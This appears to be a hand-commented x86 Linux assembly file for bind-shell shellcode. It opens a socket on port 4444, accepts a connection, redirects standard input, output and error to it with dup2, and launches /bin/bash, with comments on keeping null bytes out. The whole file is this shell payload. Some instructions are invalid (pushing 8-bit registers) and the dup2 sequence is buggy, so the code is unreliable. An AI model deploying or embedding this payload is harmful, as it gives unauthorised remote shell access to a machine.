global _start

section .text
_start:

  ;xor eax, eax
  ;xor ebx, ebx
  ;xor ecx, ecx

  xor ecx, ecx
  xor ebx, ebx
  mul ebx ; saved a byte, now eax, ebx, ecx, and edx are 0


  ;mov eax, 102 ; socket system call number
  ;mov ebx, 1 ; subfunction number for socket.socket()
  ;push 0 ;protocol
  ;push 1 ; SOCK_STREAM, I couldn't find a list of numbers mapped to types, but I figured I would just go in order from the man page
  ;push 2 ; AF_INET

  ;mov ecx, esp ; move stack pointer into ecx

  ;int 0x80 ; interrupt

  mov al, 0x66 ; using hex to better keep track of how many bytes we're moving around
               ; use a programming calculator to easily convert
               ; moving into al instead of eax because the extra 0x00 bytes would
               ; be included in the shellcode (see screenshot)
  mov bl, 0x1
  push cl      ; we can't have 0x00 in the shellcode, but we know ecx=0
  push bl      ; because 1 is already in bl
  push 2

  mov ecx, esp
  int 0x80

  ;mov edx,eax ; move file descriptor into edx for later


  ;push dword 0 ; in_addr_any (last thing in the sockaddr_in struct)
  ;push word 0x5C11 ; 4444 (base 10) in hex is 0x115C, so in network byte order, it's 0x5C11
  ;push word 2 ; AF_INET
  ;mov ecx, esp ; mov stack pointer into ecx for address of struct

  ;push byte 16 ; length of sock_addr
  ;push ecx ; struct
  ;push edx ; file descriptor returned by first socket call

  ;xor eax,eax
  ;mov eax, 102 ; socket system call
  ;mov ebx, 2 ; subfunction number for bind
  ;mov ecx, esp
  ;int 0x80

  mov edi, eax ; im going to mov it into edi instead, so i can keep 0 in edx
  push dl
  push word 0x5C11
  push word 0x2
  mov ecx, esp

  push 0x10;
  push ecx
  push edi

  mul edx ; edx is 0, so eax and edx are now 0
  mov al, 0x66
  mov bl, 0x2
  mov ecx, esp
  int 0x80

  ;push 0 ; 'backlog' argument
  ;push edx ; file descriptor again
  ;mov ecx,esp ; mov stack pointer into ecx
  ;mov ebx, 4 ; subfunction number for listen()
  ;mov eax, 102; syscall #
  ;int 0x80

  push dl
  push edi
  mov ecx, esp
  mov bl, 0x4
  mov al, 0x66
  int 0x80

  ;push 0 ; args for accept()
  ;push 0 ;
  ;push edx ; file descriptor

  ;mov ecx, esp

  ;mov ebx, 5 ; subfunction number for accept()
  ;mov eax, 102 ; system call number

  ;int 0x80 ; file descriptor is saved in eax

  push dl
  push dl
  push edi

  mov ecx, esp
  mov bl, 0x5
  mov al, 0x66
  int 0x80


  ;mov ebx, eax ; file descriptor into ebx because its the first arg
  ;mov ecx, 0; stdin
  ;mov eax, 63 ; syscall # for dup2()
  ;int 0x80

  ;mov eax, 63
  ;mov ecx, 1; stdout
  ;int 0x80

  ;mov eax, 63
  ;mov ecx, 2; stderr
  ;int 0x80

  xor ecx, ecx ; have to clear ecx since we're avoiding 0x00 by moving into cl
  mov ebx, eax
  ;mov ecx, 0 <-- don't need this because it's already 0
  mov al, 0x3F
  int 0x80

  inc cl ; now its 1; stderr
  int 0x80

  inc cl
  int 0x80

  ;push dword 0 ; padding/ zero termination for string
  ;push 0x68736162 ; "////bin/bash" backwards
  ;push 0x2f6e6962
  ;push 0x2f2f2f2f

  ;mov ebx, esp ; mov the first arg, filename (path to bash) into ebx
  ;mov edx, 0 ; envp = NULL
  ;mov ecx, 0 ; argv = NULL

  ;mov eax, 11 ; syscall # for execve
  ;int 0x80

  push edx
  push 0x68736162
  push 0x2f6e6962
  push 0x2f2f2f2f

  mov ebx, esp
  ;mov edx, 0 <-- edx is already 0
  mov cl, dl
  mov al, 0xb ; (11)
  int 0x80
